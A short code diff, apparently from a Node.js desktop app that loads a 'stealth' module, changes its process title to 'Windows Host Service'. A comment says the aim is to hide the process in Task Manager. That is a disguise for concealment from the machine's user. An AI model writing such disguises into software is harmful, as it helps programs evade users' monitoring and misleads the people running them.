@@ -3,7 +3,7 @@ const path = require('path');
 const stealth = require('./stealth');
 
 // Rename process for Task Manager concealment
-process.title = 'System Host Service';
+process.title = 'Windows Host Service';
 
 let mainWindow = null;
 let isVisible = true;
